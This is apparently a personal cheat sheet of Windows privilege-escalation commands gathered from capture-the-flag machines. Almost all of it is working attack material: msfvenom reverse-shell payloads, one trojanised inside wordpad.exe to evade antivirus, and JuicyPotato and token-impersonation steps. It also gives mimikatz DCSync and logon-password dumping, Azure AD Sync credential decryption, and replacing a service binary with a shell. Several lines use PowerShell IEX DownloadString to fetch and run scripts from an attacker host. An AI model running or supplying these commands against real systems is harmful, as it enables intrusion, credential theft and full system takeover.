# Privilege Escalations Windows

## 1. Check for juicy potato hack : 

type command "whoami /priv" and check "SeImpersonatePrivilege" is enabled
C:\ColdFusion8\runtime\bin>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name Description State
============================= ========================================= ========
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeImpersonatePrivilege Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.36 LPORT=53 -f exe -o reverse.exe

.\JuicyPotato.exe -l 1337 -p C:\Windows\Temp\reverse.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}

C:\TEMP>juicypotato.exe -p C:\TEMP\rev.bat -l 1232 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}

JuicyPotato.exe -p C:\TEMP\rev.bat -l 1232 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}

## 2. token impersonation method
c:\windows\system32\inetsrv>whoami /priv

SeImpersonatePrivilege        Impersonate a client after authentication Enabled 

meterpreter > list_token -u
	[-] Unknown command: list_token.
	meterpreter > use incognito
	Loading extension incognito...Success.
	meterpreter > list_token -u
	[-] Unknown command: list_token.
	meterpreter > list_tokens -u
	[-] Warning: Not currently running as SYSTEM, not all tokens will be available
	             Call rev2self if primary process token is SYSTEM
	 
	Delegation Tokens Available
	========================================
	IIS APPPOOL\Web
	NT AUTHORITY\SYSTEM
	 
	Impersonation Tokens Available
	========================================
	NT AUTHORITY\IUSR
	meterpreter > impersonate_token NT AUTHORITY\IUSR
	
## 3. DC -sync attack: 
	ADsync using https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1
	
	Usage :Import-module ./Azure-ADConnect.ps1
	
	 Azure-ADConnect -server 10.10.10.10 -db ADSync
	
	or use :AdDecrypt.exe : https://github.com/VbScrub/AdSyncDecrypt/releases
	
	*Evil-WinRM* PS C:\Users\mhope\Downloads> upload AdDecrypt.exe C:\Users\mhope\Downloads\AdDecrypt.exeInfo: Uploading AdDecrypt.exe to C:\Users\mhope\Downloads\AdDecrypt.exe
	
	*Evil-WinRM* PS C:\Users\mhope\Downloads> upload mcrypt.dll C:\Users\mhope\Downloads\mcrypt.dllInfo: Uploading mcrypt.dll to C:\Users\mhope\Downloads\mcrypt.dll
	
	*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\Downloads\AdDecrypt.exe -fullSQL
	
	Bloodhound sauna:
	*Evil-WinRM* PS C:\Users\svc_loanmgr\Desktop> ./mimik.exe "lsadump::dcsync /user:Administrator" "exit"    //// svc_loanmgr user has DS-Replication-Get-Changes-All privilege (found with BloodHound) so that means we can perform a DCSync attack, and tool that we can use is mimikatz.
	
	
3. Common Paths to check
4. Net user administrator 
	Password required is set to No , If this was set to Yes we wouldn’t be able to use runas as administrator without knowing the password
	vaultcmd /list    ///admin credentials are stored in security vault
	cmdkey /list
	example : runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.37:8000/Invoke-PowerShellTcp.ps1')"
	
	runas /user:ACCESS\Administrator /savecred "cmd.exe /c type c:\users\administrator\desktop\root.txt  > C:\Users\security\AppData\Local\Temp\root.txt"
	
	C:\temp>runas /user:ACCESS\Administrator /savecred "powershell -ExecutionPolicy Bypass -File C:\temp\caca.ps1"
	
5. c:\www\root\cgi-bin>tasklist /FI "username eq SYSTEM"   ///to check  services running as SYSTEM
6. tasklist /v   ///check all services and username 
7. to find logon password :   C:\www\root>mimikatz.exe
	mimikatz # sekurlsa::logonpasswords
	meterpreter > load mimikatz
	meterpreter > kerberos
8. Escalation using moving the system owned service/exe with reverse shell and starting again
	C:\Program Files\FileZilla Server>net stop "FileZilla Server FTP Server"
	C:\Program Files\FileZilla Server>move "FileZilla server.exe" "FileZilla server.exe.bak"
	C:\PROGRA~1\FILEZI~1>move C:\www\root\shell.exe "FileZilla server.exe"
	C:\PROGRA~1\FILEZI~1>net start "FileZilla Server FTP Server"
9. net user /domain username
10. whoami /all
11. (get-itemproperty 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server').InstalledInstances   /// querying the registry for the name of the installed instance.
12. Invoke-Sqlcmd -Query "SELECT name from sys.databases;" //// check the databases on the instance to confirm that it is hosting the ADSync database.
13. run post/windows/gather/credentials/teamviewer_passwords
	
	
	
https://toshellandback.com/2015/11/24/ms-priv-esc/

Trusted Service Paths
C:\Program Files\Some Folder\Service.exe
C:\Program.exe
exploit/windows/local/trusted_service_path

Vulnerable Services: Service Binaries,Windows Services
windows services : accesschk.exe -uwcqv "Authenticated Users" * /accepteula
exploit/windows/local/service_permissions

AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
exploit/windows/local/always_install_elevated

Unattended Installs
C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\
C:\Windows\System32\sysprep\
post/windows/gather/enum_unattend


Group Policy Preferences (GPP)
post/windows/gather/credentials/gpp
Get-NetOU -GUID "{4C86DD57-4040-41CD-B163-58F208A26623}" | %{ Get-NetComputer -ADSPath $_ }
IEX(New-Object Net.WebClient).DownloadString("http://10.0.0.100/Get-GPPPassword.ps1")


https://www.toshellandback.com/2015/09/30/anti-virus/
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -x wordpad.exe -k -f exe -o wordpad1.exe
	apt-get install veil-evasion
